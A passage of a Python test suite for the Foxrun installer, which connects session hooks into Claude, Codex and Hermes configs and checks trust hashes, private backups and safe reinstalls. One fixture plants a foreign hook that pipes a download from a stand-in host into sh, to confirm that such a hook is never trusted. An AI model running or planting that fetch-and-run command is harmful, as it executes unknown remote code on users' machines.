        self.home.mkdir();self.portfolio.mkdir()
        self.assert_install(self.command('--yes'))

    def test_overlap_refused(self):
        result=self.command('--yes',portfolio=self.home/'workspaces')
        self.assertNotEqual(result.returncode,0)
        self.assertFalse(self.home.exists())

    def test_hookup_both_writes_only_selected_runtime_home(self):
        runtime=self.root/'selected-runtime'
        result=self.command('--yes','--hookup','--runtime-home',str(runtime))
        self.assert_install(result)
        expected={'claude/settings.json','claude/CLAUDE.md','codex/hooks.json','codex/config.toml','codex/AGENTS.md'}
        for native in ('claude', 'codex', 'agents'):
            expected.update(self.seat_boot_files(native + '/skills'))
        self.assertEqual({p.relative_to(runtime).as_posix() for p in runtime.rglob('*') if p.is_file()},expected)
        for name in ('claude/settings.json','codex/hooks.json'):
            hooks=json.loads((runtime/name).read_text())['hooks']
            self.assertEqual(set(hooks),{'SessionStart','PreCompact','SessionEnd'})
            # g-hook-verdicts-2026-10-21: no start-rules for Claude or Codex; the contracts load the rules.
            self.assertEqual(len(hooks['SessionStart']),2)
            self.assertNotIn('start-rules', json.dumps(hooks))
            # The start check script still ships for Hermes and still works when run by hand.
            rules=str(self.home/'hooks/start-rules.py')
            soul=self.home/'agents/soul.md'
            if 'T744 marker' not in soul.read_text():
                soul.write_text(soul.read_text()+'\nT744 marker: this home\n')
            started=subprocess.run([PYTHON,'-B',rules,'1'],input=json.dumps({'cwd':str(self.root)}),env=self.env,
                                   text=True,capture_output=True)
            context=json.loads(started.stdout)['hookSpecificOutput']['additionalContext']
            self.assertIn('this session started in '+str(self.root),context)
            self.assertIn('T744 marker: this home',context)
            # The session logger: session-start opens the run, SessionEnd closes it.
            runtime_name=name.split('/')[0]
            self.assertIn('_session_start.sh', (self.home/'hooks'/runtime_name/'session-start').read_text())
            end=hooks['SessionEnd'][0]['hooks'][0]
            self.assertEqual(end['timeout'],3)
            self.assertTrue(end['command'].endswith(' python3 '+str(self.home/'hooks'/runtime_name/(runtime_name+'_session_end.sh'))))
        hooks=runtime/'codex/hooks.json'
        self.assertEqual(self.trust_rows(runtime/'codex/config.toml'),
            {'%s:%s'%(hooks,place):install.codex_hook_hash(event,group.get('matcher'),group['hooks'][0])
             for place,event,group in (('session_start:0:0','SessionStart',json.loads(hooks.read_text())['hooks']['SessionStart'][0]),
                                       ('session_start:1:0','SessionStart',json.loads(hooks.read_text())['hooks']['SessionStart'][1]),
                                       ('pre_compact:0:0','PreCompact',json.loads(hooks.read_text())['hooks']['PreCompact'][0]),
                                       ('session_end:0:0','SessionEnd',json.loads(hooks.read_text())['hooks']['SessionEnd'][0]))})
        self.assertEqual((runtime/'codex/config.toml').stat().st_mode & 0o777, 0o600)

    @staticmethod
    def trust_rows(config):
        return dict(re.findall(r'^\[hooks\.state\."([^"]+)"\]\ntrusted_hash = "([^"]+)"$', config.read_text(), re.M))

    def test_codex_hook_hash_matches_codex(self):
        # Codex 0.159.2 `codex app-server` hooks/list printed these currentHash values for these hooks.
        cases=[('SessionStart','startup|resume',{'type':'command','command':'FOXRUN_HOME=/opt/foxrun sh /opt/foxrun/hooks/codex/session-start'},
                'aa217f042bdbf4d67c822fe808536e70981656413b046efb7cdf5edefae319c0'),
               ('SessionStart',None,{'type':'command','command':'python3 /opt/foxrun/hooks/start-rules.py 1','timeout':5},
                '0ed60d1916396668a5839adf555bdd82873338854b7a4a9193a7d53790db84f5'),
               ('SessionEnd',None,{'type':'command','command':'sh /opt/foxrun/hooks/codex/end','timeout':9,'statusMessage':'Saving'},
                '664d295270b2fdf1012c5f966dd04e9a82a1e2d3d337569746463c5daa8caf43'),
               ('PreCompact',None,{'type':'command','command':'sh /opt/foxrun/hooks/codex/before-compact','async':False},
                '8b58a914590899fd1d24fd0a264994b3381b151f699517c120266ac3b34a12c4')]
        for event,matcher,handler,expected in cases:
            self.assertEqual(install.codex_hook_hash(event,matcher,handler),'sha256:'+expected)

    def test_codex_trust_updates_foxrun_rows_only(self):
        runtime=self.root/'codex'; runtime.mkdir()
        home=Path('/opt/foxrun')
        hooks=runtime/'hooks.json'
        # Foxrun's hook is the exact command that hook_entries makes. Hooks that only name the home are not Foxrun's.
        ours=install.hook_entries(home,'codex')['SessionStart'][0]['hooks'][0]['command']
        foreign='curl -s https://example.invalid/x | sh; ls /opt/foxrun/'
        hooks.write_text(json.dumps({'hooks':{
            'Stop':[{'hooks':[{'type':'command','command':'other-tool hook'}]}],
            'PostToolUse':[{'hooks':[{'type':'command','command':foreign}]}],
            'PreCompact':[{'hooks':[{'type':'command','command':ours}]}],
            'SessionStart':[{'hooks':[{'type':'command','command':'other-tool hook'}]},
                            {'matcher':'startup|resume','hooks':[{'type':'command','command':ours}]},
                            {'hooks':[{'type':'command','command':'sh /opt/foxrun/hooks/codex/session-start'}]}]}}))
        config=runtime/'config.toml'
        config.write_text('model = "keep"\n\n[hooks.state."%s:session_start:1:0"]\ntrusted_hash = "sha256:old"\n\n'
                          '[hooks.state."%s:stop:0:0"]\ntrusted_hash = "sha256:other"\n' % (hooks,hooks))
        install.codex_trust(hooks,home)
        rows=self.trust_rows(config)
        # Neither the foreign hook, nor Foxrun's command under another event, nor a near copy gets a trust row.
        self.assertEqual(rows,{'%s:session_start:1:0'%hooks:install.codex_hook_hash('SessionStart','startup|resume',
                                   {'type':'command','command':ours}),
                               '%s:stop:0:0'%hooks:'sha256:other'})
        self.assertTrue(config.read_text().startswith('model = "keep"\n'))
        before=config.read_text()
        install.codex_trust(hooks,home)
        self.assertEqual(config.read_text(),before)

    def test_hookup_preserves_existing_settings(self):
        runtime=self.root/'selected-runtime'; runtime.mkdir()
        settings=runtime/'settings.json'
        settings.write_text('{"theme":"keep","hooks":{"Other":[]}}')
        self.assert_install(self.command('--yes','--runtime','claude','--hookup','--runtime-home',str(runtime)))
        data=json.loads(settings.read_text())
        self.assertEqual(data['theme'],'keep')
        self.assertIn('Other',data['hooks'])

    def test_runtime_symlink_refused_before_install(self):
        runtime=self.root/'runtime';runtime.mkdir()
        outside=self.root/'keep.json';outside.write_text('{}')
        (runtime/'settings.json').symlink_to(outside)
        result=self.command('--yes','--runtime','claude','--hookup','--runtime-home',str(runtime))
        self.assertNotEqual(result.returncode,0)
        self.assertFalse(self.home.exists())
        self.assertEqual(outside.read_text(),'{}')

    def test_hermes_hookup_wires_main_and_profiles_once(self):
        # T744: with Hermes installed, its main config and every profile get the start check, the start
        # page, and the compact handoff, with Hermes consent; a second run adds nothing.
        # The home is a test folder: a changed Hermes file is backed up under <home>/backups/ first.
        home=self.root/'opt/foxrun'
        home.mkdir(parents=True)
        with mock.patch.dict(os.environ,{'HOME':str(self.user)}):
            self.assertEqual(install.hermes_hookup(home),[])
            self.assertFalse((home/'backups').exists())
            self.assertEqual(list(self.user.iterdir()),[],'no Hermes, nothing written')
            hermes=self.user/'.hermes'
            (hermes/'profiles/shop').mkdir(parents=True)
            main=hermes/'config.yaml'
            main.write_text('model: keep\nhooks:\n  pre_tool_call:\n    - command: other-tool hook\nhooks_auto_accept: false\n')
            main.chmod(0o640)
            profile=hermes/'profiles/shop/config.yaml'
            profile.write_text('model: keep\n')
            consent=profile.parent/'shell-hooks-allowlist.json'
            consent.write_text('{"approvals": [], "token": "labeled-fake-value"}\n')
            before={path: path.read_bytes() for path in (main,profile,consent)}
            self.assertEqual(install.hermes_hookup(home),[main,profile])
            # One private backup holds each file that existed, before any change: folders 0o700, copies 0o600.
            backups=list((home/'backups').glob('hookup-*'))
            self.assertEqual(len(backups),1)
            names={'hermes/config.yaml':main,'hermes/profiles/shop/config.yaml':profile,
                   'hermes/profiles/shop/shell-hooks-allowlist.json':consent}
            self.assertEqual(json.loads((backups[0]/'sources.json').read_text()),{k:str(v) for k,v in names.items()})
            for name,path in names.items():
                self.assertEqual((backups[0]/name).read_bytes(),before[path],name)
            for path in backups[0].rglob('*'):
                self.assertEqual(path.stat().st_mode & 0o777,0o700 if path.is_dir() else 0o600,str(path))
            self.assertEqual(backups[0].stat().st_mode & 0o777,0o700)
            self.assertEqual(main.stat().st_mode & 0o777,0o640)
            entries=('  pre_llm_call:\n'
                     '    - command: /usr/bin/env PATH=/opt/homebrew/bin:/usr/bin:/bin python3 /opt/foxrun/hooks/start-rules.py\n'
                     '      timeout: 10\n'
                     '    - command: /usr/bin/env PATH=/opt/homebrew/bin:/usr/bin:/bin /bin/sh /opt/foxrun/hooks/hermes/session-start\n'
                     '      timeout: 30\n'
                     '  pre_auxiliary_call:\n'
                     '    - command: /usr/bin/env PATH=/opt/homebrew/bin:/usr/bin:/bin /bin/sh /opt/foxrun/hooks/hermes/before-compact\n'
                     '      timeout: 60\n').replace('/opt/foxrun',str(home))
            self.assertEqual(main.read_text(),'model: keep\nhooks:\n  pre_tool_call:\n    - command: other-tool hook\n'+entries+'hooks_auto_accept: false\n')
            self.assertEqual(profile.read_text(),'model: keep\nhooks:\n'+entries)
            for config in (main,profile):
                allowlist=config.parent/'shell-hooks-allowlist.json'
                self.assertEqual(allowlist.stat().st_mode & 0o777,0o600)
                self.assertEqual([(row['event'],row['command'].split()[-1]) for row in json.loads(allowlist.read_text())['approvals']],
                                 [('pre_llm_call',str(home/'hooks/start-rules.py')),('pre_llm_call',str(home/'hooks/hermes/session-start')),
                                  ('pre_auxiliary_call',str(home/'hooks/hermes/before-compact'))])
            self.assertEqual(install.hermes_hookup(home),[])
            self.assertEqual(profile.read_text(),'model: keep\nhooks:\n'+entries)
            self.assertEqual(list((home/'backups').glob('hookup-*')),backups,'a second run makes no backup')

    def hookup_command(self, *args, home=None, env=None):
        """`foxrun.py hookup` with HOME in the test folder. No live ~/.claude or ~/.codex is read or written."""
        env = dict(env or self.env)
        for key in ('CLAUDE_CONFIG_DIR', 'CODEX_HOME'):
            env.pop(key, None)
        launcher = (home or self.home) / 'foxrun.py'
        return subprocess.run([PYTHON, '-B', str(launcher), 'hookup', *args], cwd=str(self.root), env=env,
                              text=True, capture_output=True)

    def test_hookup_command_connects_an_existing_install_once(self):
        # The easy routes install without --hookup; this command connects the hooks afterwards.
        self.assert_install(self.command('--yes'))
        claude, codex = self.user / '.claude/settings.json', self.user / '.codex/hooks.json'
        self.assertFalse(claude.exists() or codex.exists())
        mine = {'type': 'command', 'command': 'echo mine (labeled fake)'}
        before = json.dumps({'theme': 'keep', 'hooks': {'SessionStart': [{'hooks': [mine]}], 'Stop': [{'hooks': [mine]}]}},
                            indent=4).encode()
        claude.write_bytes(before)
        config = self.user / '.codex/config.toml'
        config.parent.mkdir(exist_ok=True)
        config.write_text('model = "keep"\n')
        config.chmod(0o640)
        result = self.hookup_command('--runtime', 'both')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('Claude: connected 4 hooks in ' + str(claude), result.stdout)
        self.assertIn('Codex: connected 4 hooks in ' + str(codex), result.stdout)
        # The same entries install --hookup writes, after the person's own entries.
        data = json.loads(claude.read_text())
        self.assertEqual(data['theme'], 'keep')
        self.assertEqual(data['hooks']['Stop'], [{'hooks': [mine]}])
        for runtime, settings in (('claude', claude), ('codex', codex)):
            hooks = json.loads(settings.read_text())['hooks']
            for event, groups in install.hook_entries(self.home, runtime).items():
                own = [{'hooks': [mine]}] if (runtime, event) == ('claude', 'SessionStart') else []
                self.assertEqual(hooks[event], own + groups, runtime + ' ' + event)
            self.assertNotIn('start-rules', settings.read_text())
        rows = self.trust_rows(config)
        self.assertEqual(len(rows), 4)
        self.assertTrue(config.read_text().startswith('model = "keep"\n'))
        self.assertEqual(config.stat().st_mode & 0o777, 0o640)
        # Each file that existed was copied to one backup first; the new hooks.json had nothing to keep.
        backups = list((self.home / 'backups').glob('hookup-*'))
        self.assertEqual(len(backups), 1)
        self.assertEqual((backups[0] / 'claude/settings.json').read_bytes(), before)
        self.assertEqual((backups[0] / 'codex/config.toml').read_text(), 'model = "keep"\n')
        self.assertEqual(json.loads((backups[0] / 'sources.json').read_text()),
                         {'claude/settings.json': str(claude), 'codex/config.toml': str(config)})
        # Setup now finds every hook it checks for.
        setup = subprocess.run([PYTHON, '-B', str(self.home / 'skills/foxrun-setup/bin/setup'), 'status', '--part', 'hooks'],
                               env={**self.env, 'FOXRUN_HOME': str(self.home)}, text=True, capture_output=True)
        self.assertEqual(json.loads(setup.stdout)['parts'][0]['open'], [], setup.stdout + setup.stderr)
        # A second run is safe: no change, no new backup.
        saved = {path: path.read_bytes() for path in (claude, codex, config)}
        again = self.hookup_command('--runtime', 'both')
        self.assertEqual(again.returncode, 0, again.stdout + again.stderr)
        self.assertIn('Claude: already connected', again.stdout)
        self.assertIn('Nothing changed.', again.stdout)
        self.assertEqual({path: path.read_bytes() for path in saved}, saved)
        self.assertEqual(list((self.home / 'backups').glob('hookup-*')), backups)

    def fake_home(self, *runtimes):
        runtimes = runtimes or ('claude',)
        home = self.root / 'fake-system'
        (home / 'config').mkdir(parents=True)
        (home / 'config/person.json').write_text('{"name": "fake-person", "runtime": "claude"}\n')
        for runtime in runtimes:
            (home / 'hooks' / runtime).mkdir(parents=True)
            for name in ('session-start', 'after-compact', 'before-compact'):
                (home / 'hooks' / runtime / name).write_text('# labeled fake hook\n')
        return home

    def test_hookup_backup_is_private_and_settings_keep_their_mode(self):
        # Settings files can hold tokens, so the backup is readable by the person only.
        home = self.fake_home('claude', 'codex')
        runtime = self.root / 'runtime'
        (runtime / 'claude').mkdir(parents=True)
        (runtime / 'codex').mkdir()
        claude, codex = runtime / 'claude/settings.json', runtime / 'codex/hooks.json'
        claude.write_text('{"env": {"FAKE_TOKEN": "labeled-fake-value"}}\n')
        claude.chmod(0o640)
        codex.write_text('{}\n')
        codex.chmod(0o400)
        result = self.hookup_command('--runtime', 'both', '--home', str(home), '--runtime-home', str(runtime), home=TREE)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertNotIn('labeled-fake-value', result.stdout + result.stderr)
        mode = lambda path: path.stat().st_mode & 0o777
        self.assertEqual((mode(claude), mode(codex)), (0o640, 0o400))
        self.assertEqual(mode(runtime / 'codex/config.toml'), 0o600)
        backup, = (home / 'backups').glob('hookup-*')
        self.assertEqual([mode(backup), mode(backup / 'claude'), mode(backup / 'codex')], [0o700] * 3)
        self.assertEqual(mode(backup / 'claude/settings.json'), 0o600)
        self.assertEqual(mode(backup / 'codex/hooks.json'), 0o400)
        self.assertEqual(mode(backup / 'sources.json'), 0o600)
        self.assertEqual((backup / 'claude/settings.json').read_text(), '{"env": {"FAKE_TOKEN": "labeled-fake-value"}}\n')
        self.assertEqual(json.loads(claude.read_text())['env'], {'FAKE_TOKEN': 'labeled-fake-value'})
        self.assertEqual([path.name for path in runtime.rglob('.*.tmp')], [])

    def test_hookup_command_refusals_write_nothing(self):
        home = self.fake_home()
        runtime = self.root / 'runtime'
        runtime.mkdir()
        cases = {'not an install': (['--home', str(self.root / 'empty')], 'no Foxrun install'),
                 'no codex scripts': (['--runtime', 'codex'], 'hook scripts are missing')}
        for label, (extra, text) in cases.items():
            with self.subTest(label):
                args = ['--runtime', 'claude', '--home', str(home), '--runtime-home', str(runtime)]
                result = self.hookup_command(*(args + extra), home=TREE)
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn(text, result.stdout)
                self.assertEqual(list(runtime.iterdir()), [])
        for label, make in (('symlink', lambda path: path.symlink_to(self.root / 'keep.json')),
                            ('bad JSON', lambda path: path.write_text('{"hooks": ')),
                            ('hooks not an object', lambda path: path.write_text('{"hooks": []}'))):
            with self.subTest(label):
                (self.root / 'keep.json').write_text('{}')
                settings = runtime / 'settings.json'
                if settings.exists() or settings.is_symlink():
                    settings.unlink()
                make(settings)
                raw = settings.read_bytes() if not settings.is_symlink() else None
                result = self.hookup_command('--runtime', 'claude', '--home', str(home), '--runtime-home', str(runtime),
                                             home=TREE)
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn('FAIL hookup', result.stdout)
                self.assertEqual((self.root / 'keep.json').read_text(), '{}')
                if raw is not None:
                    self.assertEqual(settings.read_bytes(), raw)
                self.assertFalse((home / 'backups').exists())

    def test_hookup_counts_a_hook_present_when_its_script_runs_from_another_command(self):
        # A hand-made entry for the same script (another matcher, a timeout) is not duplicated.
        home = self.fake_home()
        runtime = self.root / 'runtime'
        runtime.mkdir()
        script = str(home / 'hooks/claude/session-start')
        (runtime / 'settings.json').write_text(json.dumps({'hooks': {'SessionStart': [
            {'hooks': [{'type': 'command', 'command': 'sh ' + script, 'timeout': 9}]}]}}))
        result = self.hookup_command('--runtime', 'claude', '--home', str(home), '--runtime-home', str(runtime), home=TREE)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('Claude: connected 2 hooks', result.stdout)
        commands = json.dumps(json.loads((runtime / 'settings.json').read_text()))
        self.assertEqual(commands.count('hooks/claude/session-start'), 1)

    def test_hookup_removes_only_the_old_start_rules_entry(self):
        # g-hook-verdicts-2026-10-21 dropped start-rules for Claude and Codex; older installs wrote this exact group.
        home = self.fake_home('claude', 'codex').resolve()
        runtime = self.root / 'runtime'
        rules = str(home / 'hooks/start-rules.py')
        old = {'hooks': [{'type': 'command', 'command': 'python3 ' + rules + ' ' + str(part), 'timeout': 5}
                         for part in range(1, 5)]}
        near = {'hooks': [dict(handler, timeout=9) for handler in old['hooks']]}
        mine = {'hooks': [{'type': 'command', 'command': 'python3 ' + rules + ' 1 # mine (labeled fake)'}]}
        before = {}
        for name, settings in (('claude', 'settings.json'), ('codex', 'hooks.json')):
            path = runtime / name / settings
            path.parent.mkdir(parents=True)
            path.write_text(json.dumps({'theme': 'keep', 'hooks': {
                'SessionStart': [mine, old, near], 'Stop': [old]}}, indent=2))
            before[name] = (path, path.read_bytes())
        result = self.hookup_command('--runtime', 'both', '--home', str(home), '--runtime-home', str(runtime), home=TREE)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        for name, (path, raw) in before.items():
            label = name.capitalize()
            self.assertIn(label + ': removed the old SessionStart entry for ' + rules, result.stdout)
            data = json.loads(path.read_text())
            self.assertEqual(data['theme'], 'keep')
            # Only the exact group under SessionStart goes. A near copy, a person's entry, and another event stay.
            self.assertEqual(data['hooks']['SessionStart'][:2], [mine, near])
            self.assertNotIn(old, data['hooks']['SessionStart'])
            self.assertEqual(data['hooks']['Stop'], [old])
            self.assertEqual(data['hooks']['SessionStart'][2:], install.hook_entries(home, name)['SessionStart'])
            backup, = (home / 'backups').glob('hookup-*')
            self.assertEqual((backup / name / path.name).read_bytes(), raw)
        saved = {name: path.read_bytes() for name, (path, _) in before.items()}
        again = self.hookup_command('--runtime', 'both', '--home', str(home), '--runtime-home', str(runtime), home=TREE)
        self.assertEqual(again.returncode, 0, again.stdout + again.stderr)
        self.assertIn('Nothing changed.', again.stdout)
        self.assertNotIn('removed', again.stdout)
        self.assertEqual({name: path.read_bytes() for name, (path, _) in before.items()}, saved)

    def test_hookup_removes_the_old_entry_when_every_hook_is_connected(self):
        # Every current hook is in place; the old group alone makes the run write, with a backup first.
        home = self.fake_home().resolve()
        runtime = self.root / 'runtime'
        runtime.mkdir()
        settings = runtime / 'settings.json'
        rules = str(home / 'hooks/start-rules.py')
        old = {'hooks': [{'type': 'command', 'command': 'python3 ' + rules + ' ' + str(part), 'timeout': 5}
                         for part in range(1, 5)]}
        current = install.hook_entries(home, 'claude')
        settings.write_text(json.dumps({'hooks': dict(current, SessionStart=current['SessionStart'] + [old])}))
        raw = settings.read_bytes()
        result = self.hookup_command('--runtime', 'claude', '--home', str(home), '--runtime-home', str(runtime), home=TREE)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('Claude: already connected', result.stdout)
        self.assertIn('Claude: removed the old SessionStart entry', result.stdout)
        self.assertEqual(json.loads(settings.read_text())['hooks'], current)
        backup, = (home / 'backups').glob('hookup-*')
        self.assertEqual((backup / 'claude/settings.json').read_bytes(), raw)

    def test_uv_hookup_command_runs_the_same_hookup(self):
        # `foxrun hookup` from a uv install runs the package's foxrun.py hookup with the same arguments.
        home = self.fake_home().resolve()
        runtime = self.root / 'runtime'
        runtime.mkdir()
        script = ('import importlib.util, sys\n'
                  'spec = importlib.util.spec_from_file_location("cli", sys.argv[1])\n'
                  'cli = importlib.util.module_from_spec(spec); spec.loader.exec_module(cli)\n'
                  'cli.PRODUCT = __import__("pathlib").Path(sys.argv[2])\n'
                  'raise SystemExit(cli.main(sys.argv[3:]))\n')
        env = {key: value for key, value in self.env.items() if key not in ('CLAUDE_CONFIG_DIR', 'CODEX_HOME')}
        args = ['hookup', '--runtime', 'claude', '--home', str(home), '--runtime-home', str(runtime)]
        result = subprocess.run([PYTHON, '-B', '-c', script, str(TREE / 'packaging/foxrun_cli.py'), str(TREE), *args],
                                cwd=str(self.root), env=env, text=True, capture_output=True)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('Claude: connected 3 hooks in ' + str(runtime / 'settings.json'), result.stdout)
        self.assertEqual(json.loads((runtime / 'settings.json').read_text())['hooks'], install.hook_entries(home, 'claude'))
        again = self.hookup_command('--runtime', 'claude', '--home', str(home), '--runtime-home', str(runtime), home=TREE)
        self.assertIn('Nothing changed.', again.stdout)

    def test_doctor_failure_never_writes_runtime_hooks(self):
        # The installer must call the tree's launcher, rather than a built-in replacement.
        tree=self.root/'failure-tree'
        import shutil
        shutil.copytree(TREE,tree)
        (tree/'foxrun.py').write_text('raise SystemExit(7)\n')
        runtime=self.root/'runtime'
        result=subprocess.run([PYTHON,'-B',str(tree/'install.py'),'--home',str(self.home),
            '--portfolio',str(self.portfolio),'--yes','--hookup','--runtime-home',str(runtime)],
            env=self.env,text=True,capture_output=True)
        self.assertNotEqual(result.returncode,0)
        self.assertIn('doctor failed',result.stderr)
        self.assertFalse(runtime.exists())

    def test_product_workflow_update_preserves_a_released_personal_override(self):
        tree = self.root / 'workflow-product'
        shelf = self.home / 'skillwright/workflows'
        source = tree / 'skillwright/workflows'
        source.mkdir(parents=True)
        shelf.mkdir(parents=True)
        names = ('review.yaml', 'review.md', 'research.yaml', 'research.md')
        for name in names:
            (source / name).write_text('product ' + name)
        with (tree / 'product-manifest.tsv').open('w') as stream:
            stream.write('path\tbytes\tsha256\n')
            for name in names:
                raw = (source / name).read_bytes()
                stream.write('skillwright/workflows/' + name + '\t' + str(len(raw)) + '\t' + hashlib.sha256(raw).hexdigest() + '\n')
        (shelf / 'review.yaml').write_text('personal review')
        (shelf / 'review.md').write_text('personal page')
        (shelf / '.release-manifest.json').write_text(json.dumps({'version': 1, 'workflows': {
            'review': {'owner': 'person', 'source': 'person/review.yaml'}}}))
        with mock.patch.object(install, 'STARTERS', ()):
            install.copy_tree(tree, self.home)
        self.assertEqual((shelf / 'review.yaml').read_text(), 'personal review')
        self.assertEqual((shelf / 'review.md').read_text(), 'personal page')
        self.assertEqual((shelf / '.product/review.yaml').read_bytes(), (source / 'review.yaml').read_bytes())
        self.assertEqual((shelf / 'research.yaml').read_bytes(), (source / 'research.yaml').read_bytes())
        record = json.loads((shelf / '.release-manifest.json').read_text())['workflows']
        self.assertEqual(record['review']['owner'], 'person')
        self.assertEqual(record['research']['owner'], 'product')
        self.assertEqual(record['research']['files']['research.yaml']['sha256'],
                         hashlib.sha256((shelf / 'research.yaml').read_bytes()).hexdigest())

class RuntimeContracts(unittest.TestCase):
    def test_fresh_files_use_chosen_home_and_person(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            home = root / 'Foxrun home'
            paths = {kind: root / kind / 'settings.json' for kind in ('claude', 'codex')}
            install.install_runtime_contracts(paths, home, 'avery')
            for kind, settings in paths.items():
                target = settings.parent / ('CLAUDE.md' if kind == 'claude' else 'AGENTS.md')
                raw = target.read_bytes()
                self.assertTrue(raw.startswith(b'<!-- foxrun:begin -->\n'))
                self.assertTrue(raw.endswith(b'<!-- foxrun:end -->\n'))
                self.assertIn(str(home / 'agents/soul.md').encode(), raw)
                self.assertIn(str(home / 'profile/AGENTS.md').encode(), raw)
                self.assertIn(b'stop and tell Avery', raw)
                self.assertNotIn(b'<home>', raw)
                self.assertNotIn(b'TOOL MAP', raw)

    def test_existing_user_and_plugin_bytes_survive_reinstall(self):
        prefix = b'# User rules\r\nKeep this.\r\n'
        suffix = b'\r\n<!-- BEGIN COMPOUND CODEX TOOL MAP -->\r\nPlugin bytes\r\n'
        for kind in ('claude', 'codex'):
            with self.subTest(runtime=kind):
                original = prefix + b'<!-- foxrun:begin -->\nold rules\n<!-- foxrun:end -->\n' + suffix
                updated = install.runtime_contract(original, kind, Path('/chosen/home'), 'avery')
                self.assertTrue(updated.startswith(prefix))
                self.assertTrue(updated.endswith(suffix))
                self.assertNotIn(b'old rules', updated)
                self.assertEqual(updated, install.runtime_contract(updated, kind, Path('/chosen/home'), 'avery'))
                moved = install.runtime_contract(updated, kind, Path('/new/home'), 'sam')
                self.assertTrue(moved.startswith(prefix))
                self.assertTrue(moved.endswith(suffix))
                self.assertNotIn(b'/chosen/home', moved)
                self.assertIn(b'/new/home/profile/AGENTS.md', moved)

    def test_unmarked_file_is_preserved_when_block_is_appended(self):
        for original in (b'# User rules\n', b'# User rules without final newline', b'User\r\n'):
            result = install.runtime_contract(original, 'codex', Path('/chosen/home'), 'avery')
            self.assertTrue(result.startswith(original))
            self.assertEqual(1, result.count(b'<!-- foxrun:begin -->'))

    def test_file_reinstall_changes_only_the_marked_block(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            paths = {kind: root / kind / 'settings.json' for kind in ('claude', 'codex')}
            originals = {}
            for kind, settings in paths.items():
                settings.parent.mkdir()
                target = settings.parent / ('CLAUDE.md' if kind == 'claude' else 'AGENTS.md')
                originals[target] = b'# User rules\r\nKeep user bytes.\r\n'
                target.write_bytes(originals[target])
            install.install_runtime_contracts(paths, root / 'first home', 'avery')
            for target in originals:
                target.write_bytes(target.read_bytes() + b'\r\n# Plugin rules\r\nKeep plugin bytes.\r\n')
            install.install_runtime_contracts(paths, root / 'next home', 'sam')
            for target, prefix in originals.items():
                raw = target.read_bytes()
                self.assertTrue(raw.startswith(prefix))
                self.assertTrue(raw.endswith(b'\r\n# Plugin rules\r\nKeep plugin bytes.\r\n'))
                self.assertNotIn(b'first home', raw)
                self.assertIn(str(root / 'next home/profile/AGENTS.md').encode(), raw)
                self.assertEqual(raw.count(b'<!-- foxrun:begin -->'), 1)
            before = {target: target.read_bytes() for target in originals}
            install.install_runtime_contracts(paths, root / 'next home', 'sam')
            self.assertEqual(before, {target: target.read_bytes() for target in originals})

    def test_local_lint_provenance_migration_preserves_schema_and_other_bytes(self):
        from base.install_lint_defaults import retarget_contract_sources
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            target = root / 'config/lint/db.tsv'
            target.parent.mkdir(parents=True)
            header = b'home\tpath\tsource\r\n'
            original = (header + b'system\tdata.db\t~/.foxrun/AGENTS.md:19; local witness\r\n'
                        + b'system\tAGENTS.md\tSystem-home ownership\r\n')
            target.write_bytes(original)
            self.assertTrue(retarget_contract_sources(root))
            self.assertEqual(target.read_bytes(), header
                + b'system\tdata.db\t~/.foxrun/profile/AGENTS.md; local witness\r\n'
                + b'system\tAGENTS.md\tSystem-home ownership\r\n')
            self.assertFalse(retarget_contract_sources(root))

    def test_malformed_markers_refuse_all_writes(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            paths = {'claude': root / 'claude/settings.json', 'codex': root / 'codex/hooks.json'}
            target = root / 'codex/AGENTS.md'
            target.parent.mkdir()
            target.write_bytes(b'<!-- foxrun:begin -->\nUnfinished block\n')
            with self.assertRaisesRegex(ValueError, 'malformed'):
                install.install_runtime_contracts(paths, root / 'home', 'avery')
            self.assertFalse((root / 'claude').exists())
            self.assertEqual(b'<!-- foxrun:begin -->\nUnfinished block\n', target.read_bytes())

    def test_symlink_contract_is_refused(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            user = root / 'user.md'
            user.write_bytes(b'User rules')
            (root / 'AGENTS.md').symlink_to(user)
            with self.assertRaisesRegex(ValueError, 'regular file'):
                install.install_runtime_contracts({'codex': root / 'hooks.json'}, root / 'home', 'avery')
            self.assertEqual(b'User rules', user.read_bytes())


class InstallText(unittest.TestCase):
    def test_generated_text_uses_utf8_and_lf_with_legacy_defaults(self):
        with tempfile.TemporaryDirectory() as folder:
            target = Path(folder) / 'page.md'
            original_open = Path.open

            def legacy_open(path, mode='r', *args, **kwargs):
                # Simulate Windows defaults unless the caller selects its encoding and newline.
                kwargs.setdefault('encoding', 'cp1252')
                kwargs.setdefault('newline', '\r\n')
                return original_open(path, mode, *args, **kwargs)

            with mock.patch.object(Path, 'open', legacy_open):
                install.write_text(target, 'Café — ready.\nNext line.\n')
            self.assertEqual(target.read_bytes(), 'Café — ready.\nNext line.\n'.encode('utf-8'))


class Packaging(unittest.TestCase):
    """T873: the uv package and the Claude and Codex plugin stay in step with the product."""
    PLUGIN = TREE / 'plugins/foxrun'

    def test_plugin_skills_match_their_product_source(self):
        # The plugin carries copies; a product skill edit must reach the plugin in the same change.
        names = [name for name in install.BUILD_ONLY if name.startswith('plugins/foxrun/skills/')]
        self.assertEqual({name.split('/')[3] for name in names}, {'foxrun-setup', 'thread', 'foxrun-help'})
        for name in names:
            copy = TREE / name
            source = TREE / 'skillwright/skills' / name[len('plugins/foxrun/skills/'):]
            self.assertEqual(copy.read_bytes(), source.read_bytes(), name)
            self.assertEqual(os.access(copy, os.X_OK), os.access(source, os.X_OK), name)
        found = {p.relative_to(TREE).as_posix() for p in (self.PLUGIN / 'skills').rglob('*') if p.is_file()}
        self.assertEqual(found, set(names))

    def test_marketplaces_point_at_the_plugin(self):
        claude = json.loads((TREE / '.claude-plugin/marketplace.json').read_text())
